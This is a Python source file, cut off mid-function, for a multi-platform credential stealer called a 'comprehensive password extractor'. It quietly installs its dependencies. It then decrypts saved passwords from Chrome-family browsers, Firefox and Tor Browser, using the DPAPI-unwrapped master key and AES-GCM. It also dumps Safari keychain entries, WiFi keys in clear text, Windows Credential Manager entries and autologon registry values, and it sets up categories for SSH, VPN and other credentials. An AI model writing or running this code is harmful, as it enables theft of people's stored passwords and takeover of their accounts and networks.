import os
import sys
import json
import sqlite3
import base64
import shutil
import tempfile
import platform
from datetime import datetime, timedelta
import subprocess
import getpass
import hashlib
import hmac
import struct
import ctypes
import ctypes.wintypes
import winreg
import re
from pathlib import Path
import pickle
import csv
from typing import Dict, List, Tuple, Optional, Any
import uuid

# ============================================================================
# AUTO-INSTALL REQUIRED DEPENDENCIES
# ============================================================================

def install_required_packages():
    """Install all required packages automatically"""
    required_packages = [
        "pycryptodome",  # For AES decryption
        "pywin32",       # For Windows DPAPI
        "colorama",      # For colored terminal output
        "prettytable",   # For formatted tables
    ]
    
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package.replace("-", ""))
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("\n" + "="*70)
        print("📦 INSTALLING REQUIRED PACKAGES")
        print("="*70)
        
        for package in missing_packages:
            print(f"[*] Installing {package}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package, "--quiet"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"[✓] {package} installed successfully")
            except:
                print(f"[!] Failed to install {package}")
                print(f"    Please run: pip install {package}")
        
        print("[*] Reloading modules...")
        print("="*70)
        return True
    return False

# Call installation function
if install_required_packages():
    # Reload imports after installation
    import importlib
    importlib.invalidate_caches()

# ============================================================================
# IMPORT ENHANCED MODULES
# ============================================================================

try:
    from Crypto.Cipher import AES, DES3
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Hash import SHA1, SHA256
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import win32crypt
    from win32crypt import CryptUnprotectData
    HAS_WIN32CRYPT = True
except ImportError:
    HAS_WIN32CRYPT = False

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class Fore:
        GREEN = YELLOW = RED = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

try:
    from prettytable import PrettyTable
    HAS_PRETTYTABLE = True
except ImportError:
    HAS_PRETTYTABLE = False

# ============================================================================
# ADVANCED DECRYPTION ENGINE
# ============================================================================

class AdvancedDecryptionEngine:
    """Advanced engine for decrypting various password formats"""
    
    def __init__(self):
        self.decryption_stats = {
            "total_attempted": 0,
            "successful": 0,
            "failed": 0,
            "requires_master": 0
        }
    
    def decrypt_chrome_password(self, encrypted_password: bytes, browser_version: str = "latest") -> str:
        """Decrypt Chrome password with version-specific methods"""
        self.decryption_stats["total_attempted"] += 1
        
        if not encrypted_password:
            return ""
        
        try:
            # Chrome v80+ uses AES-256-GCM with master key from Local State
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                return self._decrypt_chrome_v80_plus(encrypted_password)
            
            # Older Chrome versions use DPAPI
            elif platform.system() == "Windows" and HAS_WIN32CRYPT:
                try:
                    decrypted = win32crypt.CryptUnprotectData(
                        encrypted_password,
                        None,
                        None,
                        None,
                        0
                    )
                    result = decrypted[1].decode('utf-8', errors='ignore')
                    self.decryption_stats["successful"] += 1
                    return result
                except:
                    pass
            
            # Try manual DPAPI for older versions
            return self._decrypt_manual_dpapi(encrypted_password)
            
        except Exception as e:
            self.decryption_stats["failed"] += 1
            return f"[Decryption Failed: {str(e)[:50]}]"
    
    def _decrypt_chrome_v80_plus(self, encrypted_data: bytes) -> str:
        """Decrypt Chrome v80+ passwords"""
        try:
            # Get encryption key from Local State
            key = self._get_chrome_encryption_key()
            if not key:
                return "[Encrypted - Chrome v80+]"
            
            # Extract components
            nonce = encrypted_data[3:15]  # 12-byte nonce
            ciphertext = encrypted_data[15:-16]  # Ciphertext
            tag = encrypted_data[-16:]  # 16-byte authentication tag
            
            # Create cipher
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            
            # Decrypt and verify
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            self.decryption_stats["successful"] += 1
            return decrypted.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"[Chrome v80+ Decryption Failed: {str(e)[:50]}]"
    
    def _get_chrome_encryption_key(self) -> Optional[bytes]:
        """Extract Chrome v80+ encryption key from Local State"""
        try:
            if platform.system() == "Windows":
                local_state_path = os.path.join(
                    os.environ['LOCALAPPDATA'], 
                    'Google', 
                    'Chrome', 
                    'User Data', 
                    'Local State'
                )
            elif platform.system() == "Darwin":
                local_state_path = os.path.join(
                    os.path.expanduser('~'),
                    'Library',
                    'Application Support',
                    'Google',
                    'Chrome',
                    'Local State'
                )
            else:
                local_state_path = os.path.join(
                    os.path.expanduser('~'),
                    '.config',
                    'google-chrome',
                    'Local State'
                )
            
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                
                # Get encrypted key
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                
                # Remove DPAPI prefix (5 bytes: "DPAPI")
                if encrypted_key.startswith(b'DPAPI'):
                    encrypted_key = encrypted_key[5:]
                    
                    # Decrypt using DPAPI
                    if HAS_WIN32CRYPT:
                        decrypted_key = win32crypt.CryptUnprotectData(
                            encrypted_key, None, None, None, 0
                        )[1]
                        return decrypted_key
                
                return encrypted_key
                
        except Exception:
            pass
        return None
    
    def _decrypt_manual_dpapi(self, encrypted_data: bytes) -> str:
        """Manual DPAPI decryption attempt"""
        if not HAS_CRYPTO or platform.system() != "Windows":
            return "[Manual DPAPI not supported]"
        
        try:
            # This is a simplified approach - real DPAPI requires Windows APIs
            return "[DPAPI Protected - Run as same user]"
        except:
            return "[DPAPI Decryption Failed]"
    
    def decrypt_firefox_password(self, encrypted_password: str, profile_path: str) -> str:
        """Attempt Firefox password decryption"""
        self.decryption_stats["total_attempted"] += 1
        
        if not encrypted_password:
            return ""
        
        try:
            # Check if firefox-decrypt is available
            firefox_decrypted = self._try_firefox_decrypt(encrypted_password, profile_path)
            if firefox_decrypted and "[ERROR]" not in firefox_decrypted:
                self.decryption_stats["successful"] += 1
                return firefox_decrypted
            
            # Try NSS-based decryption
            nss_decrypted = self._try_nss_decryption(encrypted_password, profile_path)
            if nss_decrypted:
                self.decryption_stats["successful"] += 1
                return nss_decrypted
            
            # Check for master password
            if self._has_firefox_master_password(profile_path):
                self.decryption_stats["requires_master"] += 1
                return "[Master Password Required]"
            
            self.decryption_stats["failed"] += 1
            return "[Firefox Decryption Failed]"
            
        except Exception as e:
            self.decryption_stats["failed"] += 1
            return f"[Firefox Error: {str(e)[:30]}]"
    
    def _try_firefox_decrypt(self, encrypted_password: str, profile_path: str) -> str:
        """Try using firefox-decrypt tool"""
        try:
            # Check if firefox_decrypt module is available
            import firefox_decrypt
            return "[Use: python -m firefox_decrypt]"
        except ImportError:
            pass
        
        # Try command-line approach
        try:
            cmd = f'python -m firefox_decrypt "{profile_path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                # Parse output
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Password:' in line and 'http' in line:
                        return line.split('Password:')[1].strip()
        except:
            pass
        
        return ""
    
    def _try_nss_decryption(self, encrypted_password: str, profile_path: str) -> str:
        """Try NSS library decryption"""
        try:
            # Decode base64
            decoded = base64.b64decode(encrypted_password)
            
            # Check for ASN.1 structure (Firefox encrypted)
            if len(decoded) > 3 and decoded[0] == 0x30:  # ASN.1 SEQUENCE
                return "[ASN.1 Encrypted - Use firefox-decrypt]"
            
            # Try simple UTF-8 decode (if no encryption)
            try:
                return decoded.decode('utf-8')
            except:
                pass
            
            # Try common encodings
            for encoding in ['latin-1', 'cp1252', 'iso-8859-1']:
                try:
                    return decoded.decode(encoding)
                except:
                    continue
            
        except:
            pass
        
        return ""
    
    def _has_firefox_master_password(self, profile_path: str) -> bool:
        """Check if Firefox has master password set"""
        try:
            # Check cert9.db for master password indicator
            cert_db = os.path.join(profile_path, 'cert9.db')
            if os.path.exists(cert_db):
                conn = sqlite3.connect(cert_db)
                cursor = conn.cursor()
                cursor.execute("SELECT COUNT(*) FROM nssPrivate WHERE a102 = 1")
                count = cursor.fetchone()[0]
                conn.close()
                return count > 0
        except:
            pass
        return False
    
    def decrypt_edge_password(self, encrypted_password: bytes) -> str:
        """Decrypt Microsoft Edge password (similar to Chrome)"""
        return self.decrypt_chrome_password(encrypted_password, "edge")
    
    def get_stats(self) -> Dict:
        """Get decryption statistics"""
        return self.decryption_stats.copy()

# ============================================================================
# COMPREHENSIVE PASSWORD EXTRACTION
# ============================================================================

class ComprehensivePasswordExtractor:
    """Extract passwords from all possible sources"""
    
    def __init__(self):
        self.decryption_engine = AdvancedDecryptionEngine()
        self.extracted_data = {
            "browser_passwords": [],
            "wifi_passwords": [],
            "system_credentials": [],
            "email_clients": [],
            "ftp_clients": [],
            "database_clients": [],
            "vpn_configs": [],
            "ssh_keys": [],
            "game_credentials": [],
            "application_passwords": []
        }
    
    def extract_all_passwords(self) -> Dict:
        """Extract passwords from all sources"""
        print(f"\n{Fore.CYAN}{Style.BRIGHT}[*] STARTING COMPREHENSIVE PASSWORD EXTRACTION")
        print(f"{Fore.CYAN}{'='*70}")
        
        # Browser passwords
        print(f"{Fore.YELLOW}[1] EXTRACTING BROWSER PASSWORDS...")
        self._extract_browser_passwords()
        
        # WiFi passwords
        print(f"{Fore.YELLOW}[2] EXTRACTING WIFI PASSWORDS...")
        self._extract_wifi_passwords()
        
        # System credentials
        print(f"{Fore.YELLOW}[3] EXTRACTING SYSTEM CREDENTIALS...")
        self._extract_system_credentials()
        
        # Email clients
        print(f"{Fore.YELLOW}[4] CHECKING EMAIL CLIENTS...")
        self._extract_email_clients()
        
        # FTP/SSH clients
        print(f"{Fore.YELLOW}[5] CHECKING FTP/SSH CLIENTS...")
        self._extract_ftp_ssh_clients()
        
        # Database clients
        print(f"{Fore.YELLOW}[6] CHECKING DATABASE CLIENTS...")
        self._extract_database_clients()
        
        # VPN configurations
        print(f"{Fore.YELLOW}[7] CHECKING VPN CONFIGURATIONS...")
        self._extract_vpn_configs()
        
        # Game credentials
        print(f"{Fore.YELLOW}[8] CHECKING GAME CREDENTIALS...")
        self._extract_game_credentials()
        
        # Application passwords
        print(f"{Fore.YELLOW}[9] CHECKING APPLICATION PASSWORDS...")
        self._extract_application_passwords()
        
        return self.extracted_data
    
    def _extract_browser_passwords(self):
        """Extract passwords from all browsers"""
        browsers = {
            "Chrome": self._extract_chrome_passwords,
            "Firefox": self._extract_firefox_passwords,
            "Edge": self._extract_edge_passwords,
            "Opera": self._extract_opera_passwords,
            "Brave": self._extract_brave_passwords,
            "Vivaldi": self._extract_vivaldi_passwords,
            "Safari": self._extract_safari_passwords,
            "Internet Explorer": self._extract_ie_passwords,
            "Chromium": self._extract_chromium_passwords,
            "Tor Browser": self._extract_tor_passwords
        }
        
        for browser_name, extract_func in browsers.items():
            try:
                print(f"    {Fore.WHITE}→ Checking {browser_name}...")
                passwords = extract_func()
                self.extracted_data["browser_passwords"].extend(passwords)
            except Exception as e:
                print(f"    {Fore.RED}✗ {browser_name} failed: {str(e)[:50]}")
    
    def _extract_chrome_passwords(self) -> List[Dict]:
        """Extract Chrome passwords with enhanced decryption"""
        passwords = []
        base_paths = []
        
        # Windows
        if platform.system() == "Windows":
            base_paths.append(os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'))
            # Also check for Chrome Beta/Dev/Canary
            for version in ['Chrome Beta', 'Chrome Dev', 'Chrome SxS']:
                path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', version, 'User Data')
                if os.path.exists(path):
                    base_paths.append(path)
        
        # macOS
        elif platform.system() == "Darwin":
            base_paths.append(os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome'))
        
        # Linux
        else:
            base_paths.append(os.path.join(os.path.expanduser('~'), '.config', 'google-chrome'))
            base_paths.append(os.path.join(os.path.expanduser('~'), '.config', 'chromium'))
        
        for base_path in base_paths:
            if os.path.exists(base_path):
                # Find all profiles
                profiles = ['Default']
                for item in os.listdir(base_path):
                    if item.startswith('Profile'):
                        profiles.append(item)
                
                for profile in profiles:
                    login_db = os.path.join(base_path, profile, 'Login Data')
                    if os.path.exists(login_db):
                        passwords.extend(self._extract_chrome_style_passwords(login_db, 'Chrome', profile))
        
        return passwords
    
    def _extract_chrome_style_passwords(self, db_path: str, browser: str, profile: str) -> List[Dict]:
        """Extract passwords from Chrome-style databases"""
        passwords = []
        
        try:
            # Copy database (original is locked by browser)
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            temp_db.close()
            shutil.copy2(db_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            conn.text_factory = bytes  # Handle binary password data
            cursor = conn.cursor()
            
            # Get schema info
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [table[0].decode('utf-8') if isinstance(table[0], bytes) else table[0] 
                     for table in cursor.fetchall()]
            
            # Try different table names
            login_table = None
            for table in tables:
                if 'logins' in table.lower():
                    login_table = table
                    break
            
            if login_table:
                # Get column names
                cursor.execute(f"PRAGMA table_info({login_table})")
                columns = [col[1] for col in cursor.fetchall()]
                
                # Construct query based on available columns
                select_cols = []
                for col in ['origin_url', 'username_value', 'password_value', 
                           'date_created', 'date_last_used', 'times_used']:
                    if col in columns:
                        select_cols.append(col)
                
                if select_cols:
                    query = f"SELECT {', '.join(select_cols)} FROM {login_table} WHERE username_value != ''"
                    cursor.execute(query)
                    
                    for row in cursor.fetchall():
                        row_dict = dict(zip(select_cols, row))
                        
                        # Decode bytes to strings
                        url = row_dict.get('origin_url', b'').decode('utf-8', errors='ignore')
                        username = row_dict.get('username_value', b'').decode('utf-8', errors='ignore')
                        encrypted_password = row_dict.get('password_value', b'')
                        
                        # Decrypt password
                        if isinstance(encrypted_password, bytes) and len(encrypted_password) > 0:
                            password = self.decryption_engine.decrypt_chrome_password(encrypted_password)
                        else:
                            password = ""
                        
                        # Parse dates
                        date_created = self._parse_chrome_time(row_dict.get('date_created', 0))
                        date_last_used = self._parse_chrome_time(row_dict.get('date_last_used', 0))
                        
                        passwords.append({
                            'browser': browser,
                            'profile': profile,
                            'url': url,
                            'username': username,
                            'password': password,
                            'date_created': date_created,
                            'date_last_used': date_last_used,
                            'times_used': row_dict.get('times_used', 0),
                            'encryption_status': 'Decrypted' if password and '[' not in password else 'Encrypted',
                            'source': 'Login Data'
                        })
            
            conn.close()
            os.unlink(temp_db.name)
            
        except Exception as e:
            print(f"    {Fore.RED}✗ {browser} ({profile}) error: {str(e)[:50]}")
        
        return passwords
    
    def _parse_chrome_time(self, chrome_time: int) -> str:
        """Parse Chrome timestamp to readable format"""
        if not chrome_time or chrome_time == 0:
            return "Never"
        
        try:
            # Chrome time is microseconds since 1601-01-01
            epoch_start = datetime(1601, 1, 1)
            delta = timedelta(microseconds=chrome_time)
            return (epoch_start + delta).strftime('%Y-%m-%d %H:%M:%S')
        except:
            return "Invalid Date"
    
    def _extract_firefox_passwords(self) -> List[Dict]:
        """Extract Firefox passwords"""
        passwords = []
        
        # Find Firefox profiles
        if platform.system() == "Windows":
            profiles_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        elif platform.system() == "Darwin":
            profiles_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox', 'Profiles')
        else:
            profiles_path = os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox')
        
        if os.path.exists(profiles_path):
            for profile_dir in os.listdir(profiles_path):
                profile_path = os.path.join(profiles_path, profile_dir)
                if os.path.isdir(profile_path):
                    # Check for logins.json
                    logins_file = os.path.join(profile_path, 'logins.json')
                    if os.path.exists(logins_file):
                        try:
                            with open(logins_file, 'r', encoding='utf-8') as f:
                                logins_data = json.load(f)
                            
                            for login in logins_data.get('logins', []):
                                url = login.get('hostname', '')
                                username = login.get('username', '')
                                encrypted_password = login.get('encryptedPassword', '')
                                time_created = login.get('timeCreated', 0)
                                time_last_used = login.get('timeLastUsed', 0)
                                
                                # Attempt decryption
                                password = self.decryption_engine.decrypt_firefox_password(
                                    encrypted_password, profile_path
                                )
                                
                                passwords.append({
                                    'browser': 'Firefox',
                                    'profile': profile_dir,
                                    'url': url,
                                    'username': username,
                                    'password': password,
                                    'date_created': datetime.fromtimestamp(time_created / 1000).strftime('%Y-%m-%d %H:%M:%S') if time_created else 'Never',
                                    'date_last_used': datetime.fromtimestamp(time_last_used / 1000).strftime('%Y-%m-%d %H:%M:%S') if time_last_used else 'Never',
                                    'encryption_status': 'Decrypted' if password and '[' not in password else 'Encrypted',
                                    'source': 'logins.json'
                                })
                                
                        except Exception as e:
                            print(f"    {Fore.RED}✗ Firefox profile {profile_dir} error: {str(e)[:50]}")
        
        return passwords
    
    def _extract_edge_passwords(self) -> List[Dict]:
        """Extract Microsoft Edge passwords"""
        passwords = []
        
        if platform.system() == "Windows":
            base_paths = [
                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge Beta', 'User Data'),
                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge Dev', 'User Data'),
                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge SxS', 'User Data')
            ]
            
            for base_path in base_paths:
                if os.path.exists(base_path):
                    profiles = ['Default']
                    for item in os.listdir(base_path):
                        if item.startswith('Profile'):
                            profiles.append(item)
                    
                    for profile in profiles:
                        login_db = os.path.join(base_path, profile, 'Login Data')
                        if os.path.exists(login_db):
                            passwords.extend(self._extract_chrome_style_passwords(login_db, 'Edge', profile))
        
        return passwords
    
    def _extract_opera_passwords(self) -> List[Dict]:
        """Extract Opera passwords"""
        passwords = []
        
        if platform.system() == "Windows":
            base_paths = [
                os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable'),
                os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera GX Stable'),
                os.path.join(os.environ['LOCALAPPDATA'], 'Programs', 'Opera', 'User Data')
            ]
        elif platform.system() == "Darwin":
            base_paths = [
                os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'com.operasoftware.Opera'),
                os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'com.operasoftware.OperaGX')
            ]
        else:
            base_paths = [
                os.path.join(os.path.expanduser('~'), '.config', 'opera'),
                os.path.join(os.path.expanduser('~'), '.config', 'opera-beta')
            ]
        
        for base_path in base_paths:
            if os.path.exists(base_path):
                login_db = os.path.join(base_path, 'Login Data')
                if os.path.exists(login_db):
                    passwords.extend(self._extract_chrome_style_passwords(login_db, 'Opera', 'Default'))
        
        return passwords
    
    def _extract_brave_passwords(self) -> List[Dict]:
        """Extract Brave browser passwords"""
        passwords = []
        
        if platform.system() == "Windows":
            base_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data')
        elif platform.system() == "Darwin":
            base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'BraveSoftware', 'Brave-Browser')
        else:
            base_path = os.path.join(os.path.expanduser('~'), '.config', 'BraveSoftware', 'Brave-Browser')
        
        if os.path.exists(base_path):
            profiles = ['Default']
            for item in os.listdir(base_path):
                if item.startswith('Profile'):
                    profiles.append(item)
            
            for profile in profiles:
                login_db = os.path.join(base_path, profile, 'Login Data')
                if os.path.exists(login_db):
                    passwords.extend(self._extract_chrome_style_passwords(login_db, 'Brave', profile))
        
        return passwords
    
    def _extract_vivaldi_passwords(self) -> List[Dict]:
        """Extract Vivaldi browser passwords"""
        passwords = []
        
        if platform.system() == "Windows":
            base_path = os.path.join(os.environ['LOCALAPPDATA'], 'Vivaldi', 'User Data')
        elif platform.system() == "Darwin":
            base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Vivaldi')
        else:
            base_path = os.path.join(os.path.expanduser('~'), '.config', 'vivaldi')
        
        if os.path.exists(base_path):
            profiles = ['Default']
            for item in os.listdir(base_path):
                if item.startswith('Profile'):
                    profiles.append(item)
            
            for profile in profiles:
                login_db = os.path.join(base_path, profile, 'Login Data')
                if os.path.exists(login_db):
                    passwords.extend(self._extract_chrome_style_passwords(login_db, 'Vivaldi', profile))
        
        return passwords
    
    def _extract_safari_passwords(self) -> List[Dict]:
        """Extract Safari passwords (macOS only)"""
        passwords = []
        
        if platform.system() == "Darwin":
            try:
                # Safari stores passwords in Keychain
                import subprocess
                
                # Get list of Safari passwords from Keychain
                cmd = 'security find-internet-password -g -s safari 2>&1'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    lines = result.stdout.split('\n')
                    current_entry = {}
                    
                    for line in lines:
                        if 'password:' in line.lower():
                            password = line.split(':')[1].strip().strip('"')
                            current_entry['password'] = password
                            passwords.append(current_entry.copy())
                            current_entry = {}
                        elif 'server:' in line.lower():
                            current_entry['url'] = line.split(':')[1].strip()
                        elif 'account:' in line.lower():
                            current_entry['username'] = line.split(':')[1].strip()
                
                # Format passwords
                formatted_passwords = []
                for pwd in passwords:
                    if 'url' in pwd and 'username' in pwd:
                        formatted_passwords.append({
                            'browser': 'Safari',
                            'profile': 'Default',
                            'url': pwd.get('url', ''),
                            'username': pwd.get('username', ''),
                            'password': pwd.get('password', '[Keychain Protected]'),
                            'encryption_status': 'Keychain',
                            'source': 'macOS Keychain'
                        })
                
                return formatted_passwords
                
            except Exception as e:
                print(f"    {Fore.RED}✗ Safari extraction error: {str(e)[:50]}")
        
        return passwords
    
    def _extract_ie_passwords(self) -> List[Dict]:
        """Extract Internet Explorer passwords"""
        passwords = []
        
        if platform.system() == "Windows":
            try:
                # IE stores passwords in Credential Manager
                import winreg
                
                # Check registry for IE saved passwords
                try:
                    key_path = r"Software\Microsoft\Internet Explorer\IntelliForms\Storage2"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                        i = 0
                        while True:
                            try:
                                value_name, value_data, value_type = winreg.EnumValue(key, i)
                                # Parse IE stored passwords (simplified)
                                # Note: Actual IE password extraction is complex
                                i += 1
                            except OSError:
                                break
                except:
                    pass
                
                # Also check Credential Manager via command
                try:
                    cmd = 'cmdkey /list'
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    for line in result.stdout.split('\n'):
                        if 'Internet Explorer' in line or 'IE' in line:
                            passwords.append({
                                'browser': 'Internet Explorer',
                                'profile': 'Default',
                                'url': 'IE Credential',
                                'username': 'Credential Manager',
                                'password': '[Credential Manager]',
                                'encryption_status': 'DPAPI Protected',
                                'source': 'Windows Credential Manager'
                            })
                except:
                    pass
                
            except Exception as e:
                print(f"    {Fore.RED}✗ IE extraction error: {str(e)[:50]}")
        
        return passwords
    
    def _extract_chromium_passwords(self) -> List[Dict]:
        """Extract Chromium passwords"""
        passwords = []
        
        if platform.system() == "Linux":
            base_path = os.path.join(os.path.expanduser('~'), '.config', 'chromium')
            if os.path.exists(base_path):
                profiles = ['Default']
                for item in os.listdir(base_path):
                    if item.startswith('Profile'):
                        profiles.append(item)
                
                for profile in profiles:
                    login_db = os.path.join(base_path, profile, 'Login Data')
                    if os.path.exists(login_db):
                        passwords.extend(self._extract_chrome_style_passwords(login_db, 'Chromium', profile))
        
        return passwords
    
    def _extract_tor_passwords(self) -> List[Dict]:
        """Extract Tor Browser passwords"""
        passwords = []
        
        # Tor Browser is based on Firefox
        if platform.system() == "Windows":
            tor_path = os.path.join(os.environ['LOCALAPPDATA'], 'tor-browser', 'Browser', 'TorBrowser', 'Data', 'Browser', 'profile.default')
        elif platform.system() == "Darwin":
            tor_path = os.path.join('/Applications', 'Tor Browser.app', 'Contents', 'Resources', 'TorBrowser', 'Data', 'Browser', 'profile.default')
        else:
            tor_path = os.path.join(os.path.expanduser('~'), '.local', 'share', 'tor-browser', 'Browser', 'TorBrowser', 'Data', 'Browser', 'profile.default')
        
        if os.path.exists(tor_path):
            logins_file = os.path.join(tor_path, 'logins.json')
            if os.path.exists(logins_file):
                try:
                    with open(logins_file, 'r', encoding='utf-8') as f:
                        logins_data = json.load(f)
                    
                    for login in logins_data.get('logins', []):
                        url = login.get('hostname', '')
                        username = login.get('username', '')
                        encrypted_password = login.get('encryptedPassword', '')
                        
                        password = self.decryption_engine.decrypt_firefox_password(
                            encrypted_password, tor_path
                        )
                        
                        passwords.append({
                            'browser': 'Tor Browser',
                            'profile': 'Default',
                            'url': url,
                            'username': username,
                            'password': password,
                            'encryption_status': 'Decrypted' if password and '[' not in password else 'Encrypted',
                            'source': 'Tor Browser profile'
                        })
                        
                except Exception as e:
                    print(f"    {Fore.RED}✗ Tor Browser extraction error: {str(e)[:50]}")
        
        return passwords
    
    def _extract_wifi_passwords(self):
        """Extract WiFi passwords with enhanced detection"""
        if platform.system() == "Windows":
            self._extract_wifi_passwords_windows()
        elif platform.system() == "Darwin":
            self._extract_wifi_passwords_mac()
        elif platform.system() == "Linux":
            self._extract_wifi_passwords_linux()
    
    def _extract_wifi_passwords_windows(self):
        """Extract WiFi passwords on Windows"""
        try:
            # Get WiFi profiles
            cmd = 'netsh wlan show profiles'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            profiles = []
            for line in result.stdout.split('\n'):
                if 'All User Profile' in line:
                    profile_name = line.split(':')[1].strip()
                    profiles.append(profile_name)
            
            for profile in profiles:
                try:
                    # Get profile details
                    cmd = f'netsh wlan show profile name="{profile}" key=clear'
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    password = "Not found"
                    security = "Unknown"
                    auth = "Unknown"
                    cipher = "Unknown"
                    
                    for line in result.stdout.split('\n'):
                        line_lower = line.lower()
                        if 'key content' in line_lower:
                            password = line.split(':')[1].strip()
                        elif 'authentication' in line_lower:
                            auth = line.split(':')[1].strip()
                        elif 'cipher' in line_lower:
                            cipher = line.split(':')[1].strip()
                        elif 'security key' in line_lower and 'absent' not in line_lower:
                            security = line.split(':')[1].strip()
                    
                    self.extracted_data["wifi_passwords"].append({
                        'ssid': profile,
                        'password': password,
                        'security': security,
                        'authentication': auth,
                        'cipher': cipher,
                        'interface': 'Wi-Fi',
                        'source': 'netsh wlan'
                    })
                    
                except:
                    continue
                    
        except Exception as e:
            print(f"    {Fore.RED}✗ WiFi extraction error: {str(e)[:50]}")
    
    def _extract_wifi_passwords_mac(self):
        """Extract WiFi passwords on macOS"""
        try:
            # Get list of known networks
            cmd = 'networksetup -listallhardwareports'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Parse and get passwords for each network
            # Note: This requires admin privileges
            cmd2 = 'security find-generic-password -ga "Wi-Fi" 2>&1 | grep "password:"'
            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
            
            if result2.returncode == 0:
                password_line = result2.stdout.strip()
                if 'password:' in password_line:
                    password = password_line.split(':')[1].strip().strip('"')
                    self.extracted_data["wifi_passwords"].append({
                        'ssid': 'Current WiFi',
                        'password': password,
                        'security': 'WPA/WPA2',
                        'source': 'macOS Keychain'
                    })
                    
        except Exception as e:
            print(f"    {Fore.RED}✗ macOS WiFi extraction error: {str(e)[:50]}")
    
    def _extract_wifi_passwords_linux(self):
        """Extract WiFi passwords on Linux"""
        try:
            # Check for NetworkManager
            nm_path = '/etc/NetworkManager/system-connections/'
            if os.path.exists(nm_path):
                for file in os.listdir(nm_path):
                    if file.endswith('.nmconnection'):
                        file_path = os.path.join(nm_path, file)
                        try:
                            with open(file_path, 'r') as f:
                                content = f.read()
                            
                            # Parse network configuration
                            ssid_match = re.search(r'ssid=(.+)', content)
                            psk_match = re.search(r'psk=(.+)', content)
                            
                            if ssid_match and psk_match:
                                self.extracted_data["wifi_passwords"].append({
                                    'ssid': ssid_match.group(1),
                                    'password': psk_match.group(1),
                                    'security': 'WPA/WPA2',
                                    'source': 'NetworkManager'
                                })
                        except:
                            continue
                            
        except Exception as e:
            print(f"    {Fore.RED}✗ Linux WiFi extraction error: {str(e)[:50]}")
    
    def _extract_system_credentials(self):
        """Extract system credentials from various sources"""
        if platform.system() == "Windows":
            self._extract_windows_credentials()
        else:
            self._extract_unix_credentials()
    
    def _extract_windows_credentials(self):
        """Extract Windows credentials"""
        try:
            # 1. Credential Manager
            cmd = 'cmdkey /list'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'Target:' in line:
                    target = line.split('Target:')[1].strip()
                    self.extracted_data["system_credentials"].append({
                        'type': 'Windows Credential',
                        'target': target,
                        'username': 'N/A (DPAPI Protected)',
                        'password': 'Encrypted by Windows',
                        'source': 'Credential Manager'
                    })
            
            # 2. Registry autologon
            try:
                import winreg
                key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                    try:
                        default_username, _ = winreg.QueryValueEx(key, "DefaultUserName")
                        default_domain, _ = winreg.QueryValueEx(key, "DefaultDomainName")
                        
                        self.extracted_data["system_credentials"].append({
                            'type': 'Windows AutoLogon',
                            'target': f"{default_domain}\\{default_username}",
                            'username': default_username,
                            'password': '[Encrypted in Registry]',
                            'source': 'Registry AutoLogon'
                        })
                    except:
                        pass
            except:
                pass
            
            # 3. Scheduled Tasks with credentials
            try:
                cmd = 'schtasks /query /fo csv /v'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
                
                lines = result.stdout.split('\n')
                if len(lines) > 1:
                    headers = lines[0].split(',')
                    for line in lines[1:]:
                        if line.strip():
                            parts = line.split(',')
                            if len(parts) > 10 and 'RUNASUSER' in headers:
